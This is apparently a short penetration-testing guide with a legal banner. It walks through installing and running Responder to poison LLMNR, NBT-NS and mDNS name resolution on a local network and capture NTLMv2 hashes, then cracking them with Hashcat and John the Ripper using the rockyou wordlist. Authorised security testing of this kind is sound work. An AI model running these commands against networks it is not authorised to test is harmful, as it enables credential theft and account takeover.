---
legal-banner: true
---

### **Step 1. Starting Responder**

To begin, ensure that Responder is installed on your system. If it’s not already installed, follow these steps:  

1. Update the package list:  
   ```bash
   sudo apt update
   ```

2. Install Responder:  
   ```bash
   sudo apt install responder
   ```

3. Run Responder with default settings, Replace `ens224` with the name of your network interface:  
   ```bash
   sudo responder -I ens224
   ```

### **Step 2. Responder Operational Overview**

Responder actively listens for **LLMNR**, **NBT-NS**, and **MDNS** requests on the network and responds to them. When it captures a hash, it saves it in the `/usr/share/responder/logs` directory. You can monitor activity either directly in the terminal or by reviewing the log files.  

- **Terminal Output:** Responder displays captured hashes and relevant information in real time.  
- **Log Files:** Captured hashes are stored in `/usr/share/responder/logs`.  
- **Captured Data:** Typically, Responder captures **NTLMv2 hashes**, logging them with real-time updates.  

### **Step 3. Cracking NTLMv2 Hashes**

Once you have captured hashes, you can crack them using **Hashcat** or **John the Ripper**.  
The examples below use the `rockyou.txt` wordlist.  

1. Crack NTLMv2 hashes with Hashcat:  
   ```bash
   hashcat -m 5600 captured_ntlmv2 /usr/share/wordlists/rockyou.txt
   ```

2. Crack NTLMv2 hashes with John the Ripper:  
   ```bash
   john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt captured_ntlmv2.txt
   ```